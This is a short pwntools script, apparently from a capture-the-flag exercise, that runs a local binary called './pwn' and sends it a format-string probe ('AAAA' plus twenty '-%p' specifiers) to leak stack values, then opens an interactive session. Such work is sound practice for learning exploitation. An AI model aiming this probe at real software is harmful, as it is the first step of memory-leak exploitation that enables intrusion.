from pwn import *

io = process("./pwn")
io.send(b"AAAA" + b"-%p"*20)

io.interactive()
